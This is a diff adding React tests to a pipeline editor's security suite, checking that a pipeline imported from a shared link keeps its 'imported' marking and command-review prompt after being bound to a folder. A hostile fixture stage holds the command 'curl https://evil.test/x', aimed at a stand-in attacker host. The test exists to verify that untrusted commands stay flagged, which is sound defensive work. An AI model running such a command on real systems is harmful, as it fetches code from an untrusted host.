@@ -172,3 +172,40 @@ describe('T-SEC-012 (SEC-02) — provenance is visible', () => {
     expect(screen.queryByText(/imported from/i)).toBeNull();
   });
 });
+
+describe('T-SEC-013 (UX-07) — binding an imported pipeline to a folder', () => {
+  it('offers a folder prompt instead of a dead end', async () => {
+    mockRoutes(loadIr());
+    window.location.hash = shareLink(hostileIr());
+    render(<Editor />);
+    fireEvent.click(await screen.findByRole('button', { name: /load the pipeline/i }));
+    await waitFor(() => screen.getByTestId('chain'));
+
+    // Previously: "Detect a workspace project to unlock ▶ Run" — and
+    // detecting would have replaced the imported document.
+    expect(screen.getByTestId('bind-folder')).toBeTruthy();
+    expect(screen.queryByTestId('run-panel')).toBeNull();
+  });
+
+  it('keeps the imported pipeline when a folder is bound', async () => {
+    mockRoutes(loadIr());
+    window.location.hash = shareLink(hostileIr());
+    render(<Editor />);
+    fireEvent.click(await screen.findByRole('button', { name: /load the pipeline/i }));
+    await waitFor(() => screen.getByTestId('chain'));
+
+    fireEvent.change(screen.getByLabelText('Folder to run this pipeline against'), {
+      target: { value: 'some-project' },
+    });
+    fireEvent.click(screen.getByRole('button', { name: /use this folder/i }));
+
+    // The run panel appears…
+    await waitFor(() => expect(screen.getByTestId('run-panel')).toBeTruthy());
+    // …and the document is still the IMPORTED one, not the detected one.
+    // hostileIr()'s test stage carries the curl command; loadIr()'s does not.
+    expect(screen.getByTestId('chain').textContent).toContain('curl https://evil.test/x');
+    // Still marked imported, so the run still needs its command review.
+    expect(screen.getByText(/imported from a shared link/i)).toBeTruthy();
+    expect(screen.getByText(/need a look before the first run/i)).toBeTruthy();
+  });
+});
